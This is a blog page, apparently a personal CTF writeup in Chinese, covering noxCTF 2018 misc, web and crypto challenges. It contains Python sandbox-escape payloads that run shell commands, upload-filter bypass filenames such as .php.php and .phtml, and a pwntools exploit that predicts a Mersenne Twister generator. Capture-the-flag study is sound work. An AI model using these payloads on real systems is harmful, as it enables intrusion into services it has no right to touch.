@@ -1,0 +1,2025 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="n3k0">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="n3k0">
+    <meta name="keywords" content="neko | n3k0">
+    <meta name="description" content="incisive expression">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>noxCTF-2018 writeup · n3k0</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180501 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180501 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+        
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/alice.png" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />    
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >NEKO</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">noxCTF-2018 writeup</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>NEKO</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(http://p0sa0ryfm.bkt.clouddn.com/18-5-14/46804335.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            noxCTF-2018 writeup
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "菜猫的无能狂怒">菜猫的无能狂怒</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/09/07</span>
+                
+                
+            </div>
+        
+    </div>
+</div>
+        <script>
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+  
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+      if (postIntroTags) {
+        postIntroTags.classList.add('post-fade-in');
+      }
+      if (postIntroMeat) {
+        postIntroMeat.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p><a href="https://ctftime.org/event/671/tasks/" target="_blank" rel="noopener">https://ctftime.org/event/671/tasks/</a><br>我就是单纯地想自己写一遍<em>(:з」∠)</em></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Python-for-fun"><a href="#Python-for-fun" class="headerlink" title="Python for fun"></a>Python for fun</h2><p>python3沙盒绕过，没有waf。<br>本地实验：<br>(题目要求填写fun()的参数)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(a,b=<span class="params">(print<span class="params">(__import__<span class="params">(<span class="string">'os'</span>)</span>.system<span class="params">(<span class="string">'ls'</span>)</span>)</span>)</span>)</span>:</span></span><br><span class="line">    c=a+b</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">fun(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure></p>
+<p>result:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BlindDate.jpeg</span><br><span class="line">flag.jpeg</span><br><span class="line">test.py</span><br><span class="line">test1.py</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Python-for-fun-2"><a href="#Python-for-fun-2" class="headerlink" title="Python for fun 2"></a>Python for fun 2</h2><p>与上题相比多了waf，无法使用<strong>import</strong>等方法，网上沙盒绕过大多是python2，不适用于python3，此处给出几种payload，来自4uuu Nya和其他选手<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a,b=(print(().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__[&apos;system&apos;](&apos;ls&apos;)))</span><br><span class="line">a = print(().__ class __.__ bases__[0].__ subclasses__()[93].__init__.__ globals__[&quot;sys&quot;].modules [&quot;os&quot;].system(&quot;ls&quot;))，b = 1</span><br><span class="line"></span><br><span class="line">&apos;&apos;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;cat FLAG&quot;)</span><br><span class="line"></span><br><span class="line">a,b,c=print([].__class__.__base__.__subclasses__()[127].__init__.__globals__[&apos;system&apos;](&apos;cat FLAG&apos;))</span><br></pre></td></tr></table></figure></p>
+<p>PS:可能由于本地是python3.7版本过高的原因，本地实验未成功，暂未确定payload作用版本区间。</p>
+<h2 id="Blind-Date"><a href="#Blind-Date" class="headerlink" title="Blind Date"></a>Blind Date</h2><p>没想到用strings<br><a href="https://github.com/imthoe/noxCTF/tree/master/BlindDate" target="_blank" rel="noopener">https://github.com/imthoe/noxCTF/tree/master/BlindDate</a></p>
+<h2 id="Read-Between-The-Lines"><a href="#Read-Between-The-Lines" class="headerlink" title="Read Between The Lines"></a>Read Between The Lines</h2><p>前半段是jsfuck代码，后半段是whitespace代码，在mac上还真没看出来，windows下用notepad比较好分辨，jsfuck解密出来无重要信息，whitespace解密后得到flag。<br>jsfuck解密：<a href="http://codertab.com/JsUnFuck" target="_blank" rel="noopener">http://codertab.com/JsUnFuck</a><br>whitespace ide: <a href="http://vii5ard.github.io/whitespace/" target="_blank" rel="noopener">http://vii5ard.github.io/whitespace/</a>或者<a href="https://tio.run/#whitespace" target="_blank" rel="noopener">https://tio.run/#whitespace</a></p>
+<h2 id="Slippery-Situation"><a href="#Slippery-Situation" class="headerlink" title="Slippery Situation"></a>Slippery Situation</h2><p>收获工具:<a href="https://github.com/ptoomey3/evilarc" target="_blank" rel="noopener">evilarc</a><br><a href="https://www.pwndiary.com/write-ups/noxctf-2018-slippery-situation-write-up-misc750/" target="_blank" rel="noopener">https://www.pwndiary.com/write-ups/noxctf-2018-slippery-situation-write-up-misc750/</a></p>
+<h2 id="Marcode"><a href="#Marcode" class="headerlink" title="Marcode"></a>Marcode</h2><p><a href="https://github.com/imthoe/noxCTF/tree/master/Marcode" target="_blank" rel="noopener">https://github.com/imthoe/noxCTF/tree/master/Marcode</a><br><a href="https://github.com/DoMINAToR98/CTFs/tree/master/NOX_CTF/Misc/Marcode" target="_blank" rel="noopener">https://github.com/DoMINAToR98/CTFs/tree/master/NOX_CTF/Misc/Marcode</a><br>python识别二维码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pyzbar.pyzbar import decode</span><br><span class="line">from PIL import Image</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">for i in range(1,3490):</span><br><span class="line">    print decode(Image.open(&apos;frames/frame-&apos;+str(i).zfill(4)+&apos;.png&apos;))[0].data</span><br></pre></td></tr></table></figure></p>
+<p>去除文本重复内容:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;!x[$0]++&apos; links.txt &gt; unique_links.txt</span><br></pre></td></tr></table></figure></p>
+<p>最后得到的文本小写,’_’转空格后用word或者用mac下的pages文稿打开会有自动提示哪些单词有问题，核对下就有flag了。</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>referer伪造</p>
+<h2 id="MyFileUploader"><a href="#MyFileUploader" class="headerlink" title="MyFileUploader"></a>MyFileUploader</h2><p>这题正确wp:<a href="https://www.pwndiary.com/write-ups/noxctf-2018-myfileuploader-write-up-web200/" target="_blank" rel="noopener">https://www.pwndiary.com/write-ups/noxctf-2018-myfileuploader-write-up-web200/</a><br>但认识的人做的都是非预期:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">neko_jpg.php.php  只删除一个php</span><br><span class="line">neko_jpg.phtml  该网站解析phtml</span><br></pre></td></tr></table></figure></p>
+<h2 id="hiddenDOM"><a href="#hiddenDOM" class="headerlink" title="hiddenDOM"></a>hiddenDOM</h2><p>一直以为和网鼎杯的一个题一个套路，想用ajax读源码，然而测试后发现并不执行js。<br>看到源码的js也没想着去解，不够细心啊。<br>wp: <a href="https://rawsec.ml/en/noxCTF-2018-write-ups/#670-hiddendom-web" target="_blank" rel="noopener">https://rawsec.ml/en/noxCTF-2018-write-ups/#670-hiddendom-web</a></p>
+<h2 id="Dictionary-of-obscure-sorrows"><a href="#Dictionary-of-obscure-sorrows" class="headerlink" title="Dictionary of obscure sorrows"></a>Dictionary of obscure sorrows</h2><p>LDAP Injection:<br><a href="http://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf" target="_blank" rel="noopener">http://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf</a><br>この方のwpがもと良いと思います:<br><a href="https://graneed.hatenablog.com/entry/2018/09/09/020821" target="_blank" rel="noopener">https://graneed.hatenablog.com/entry/2018/09/09/020821</a><br>this also good wp:<a href="https://rawsec.ml/en/noxCTF-2018-write-ups/#902-dictionary-of-obscure-sorrows-web" target="_blank" rel="noopener">https://rawsec.ml/en/noxCTF-2018-write-ups/#902-dictionary-of-obscure-sorrows-web</a></p>
+<h2 id="PSRF"><a href="#PSRF" class="headerlink" title="PSRF"></a>PSRF</h2><p>暂无wp</p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Chop-Suey"><a href="#Chop-Suey" class="headerlink" title="Chop Suey"></a>Chop Suey</h2><p>已知p,q,dp,dq,c求m<br><a href="https://github.com/zionspike/ctf-writeup/blob/master/Crypto/%5BpicoCTF%202017%5D%20-%20Weird%20RSA%20-%2090/kapi-note.md" target="_blank" rel="noopener">https://github.com/zionspike/ctf-writeup/blob/master/Crypto/%5BpicoCTF%202017%5D%20-%20Weird%20RSA%20-%2090/kapi-note.md</a></p>
+<h2 id="Decryptor"><a href="#Decryptor" class="headerlink" title="Decryptor"></a>Decryptor</h2><p>给了n,c,e和一个可以解密c的nc链接，但不能直接解密给的c，选择将c分解为a,b，分别解密a,b，解密出m1,m2，则m=m1*m2 mod n。</p>
+<h2 id="Plot-Twist"><a href="#Plot-Twist" class="headerlink" title="Plot-Twist"></a>Plot-Twist</h2><p>想到预测伪随机数了，但没实现方法，无能狂怒。<br>wp:<a href="https://github.com/pberba/ctf-solutions/tree/master/20180907_nox/plot_twist" target="_blank" rel="noopener">https://github.com/pberba/ctf-solutions/tree/master/20180907_nox/plot_twist</a><br>MTRecover:<br><a href="https://github.com/eboda/mersenne-twister-recover" target="_blank" rel="noopener">https://github.com/eboda/mersenne-twister-recover</a></p>
+<p>MTRecover.py:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MT19937Recover</span>:</span></span><br><span class="line">    <span class="string">"""Reverses the Mersenne Twister based on 624 observed outputs.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The internal state of a Mersenne Twister can be recovered by observing</span></span><br><span class="line"><span class="string">    624 generated outputs of it. However, if those are not directly</span></span><br><span class="line"><span class="string">    observed following a twist, another output is required to restore the</span></span><br><span class="line"><span class="string">    internal index.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    See also https://en.wikipedia.org/wiki/Mersenne_Twister#Pseudocode .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unshiftRight</span><span class="params">(self, x, shift)</span>:</span></span><br><span class="line">        res = x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            res = x ^ res &gt;&gt; shift</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unshiftLeft</span><span class="params">(self, x, shift, mask)</span>:</span></span><br><span class="line">        res = x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            res = x ^ (res &lt;&lt; shift &amp; mask)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">untemper</span><span class="params">(self, v)</span>:</span></span><br><span class="line">        <span class="string">""" Reverses the tempering which is applied to outputs of MT19937 """</span></span><br><span class="line"></span><br><span class="line">        v = self.unshiftRight(v, <span class="number">18</span>)</span><br><span class="line">        v = self.unshiftLeft(v, <span class="number">15</span>, <span class="number">0xefc60000</span>)</span><br><span class="line">        v = self.unshiftLeft(v, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">        v = self.unshiftRight(v, <span class="number">11</span>)</span><br><span class="line">        <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(self, outputs, forward=True)</span>:</span></span><br><span class="line">        <span class="string">"""Reverses the Mersenne Twister based on 624 observed values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            outputs (List[int]): list of &gt;= 624 observed outputs from the PRNG.</span></span><br><span class="line"><span class="string">                However, &gt;= 625 outputs are required to correctly recover</span></span><br><span class="line"><span class="string">                the internal index.</span></span><br><span class="line"><span class="string">            forward (bool): Forward internal state until all observed outputs</span></span><br><span class="line"><span class="string">                are generated.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Returns a random.Random() object.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        result_state = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> len(outputs) &gt;= <span class="number">624</span>       <span class="comment"># need at least 624 values</span></span><br><span class="line"></span><br><span class="line">        ivals = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">            ivals.append(self.untemper(outputs[i]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(outputs) &gt;= <span class="number">625</span>:</span><br><span class="line">            <span class="comment"># We have additional outputs and can correctly</span></span><br><span class="line">            <span class="comment"># recover the internal index by bruteforce</span></span><br><span class="line">            challenge = outputs[<span class="number">624</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">626</span>):</span><br><span class="line">                state = (<span class="number">3</span>, tuple(ivals+[i]), <span class="keyword">None</span>)</span><br><span class="line">                r = random.Random()</span><br><span class="line">                r.setstate(state)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> challenge == r.getrandbits(<span class="number">32</span>):</span><br><span class="line">                    result_state = state</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># With only 624 outputs we assume they were the first observed 624</span></span><br><span class="line">            <span class="comment"># outputs after a twist --&gt;  we set the internal index to 624.</span></span><br><span class="line">            result_state = (<span class="number">3</span>, tuple(ivals+[<span class="number">624</span>]), <span class="keyword">None</span>)</span><br><span class="line"></span><br><span class="line">        rand = random.Random()</span><br><span class="line">        rand.setstate(result_state)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> forward:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>, len(outputs)):</span><br><span class="line">                <span class="keyword">assert</span> rand.getrandbits(<span class="number">32</span>) == outputs[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> rand</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_PythonMT19937Recover</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Just a testcase to ensure correctness"""</span></span><br><span class="line">    mtb = MT19937Recover()</span><br><span class="line"></span><br><span class="line">    r1 = random.Random(<span class="number">0x31337</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># just some discarded random numbers to move internal state forward</span></span><br><span class="line">    [r1.getrandbits(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">1234</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the actual leak of 1000 values</span></span><br><span class="line">    n = [r1.getrandbits(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">1000</span>)]</span><br><span class="line"></span><br><span class="line">    r2 = mtb.go(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> r1.getrandbits(<span class="number">32</span>) == r2.getrandbits(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test_PythonMT19937Recover()</span><br></pre></td></tr></table></figure></p>
+<p>exp.py:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> MTRecover <span class="keyword">import</span> MT19937Recover</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'chal.noxale.com'</span>, <span class="number">5115</span>)</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">to_send = <span class="string">'0'</span>*<span class="number">16</span></span><br><span class="line">bits = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">625</span>):</span><br><span class="line">	r.send(to_send)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">625</span>):</span><br><span class="line">	key = r.recvuntil(<span class="string">'key:\n'</span>).split()[<span class="number">4</span>]</span><br><span class="line">	bits.append(int(key))</span><br><span class="line"></span><br><span class="line">mtb = MT19937Recover()</span><br><span class="line">rand = mtb.go(bits)</span><br><span class="line">to_send = str(rand.getrandbits(<span class="number">32</span>)).rjust(<span class="number">16</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">r.send(to_send)</span><br><span class="line">print(r.recv())</span><br></pre></td></tr></table></figure></p>
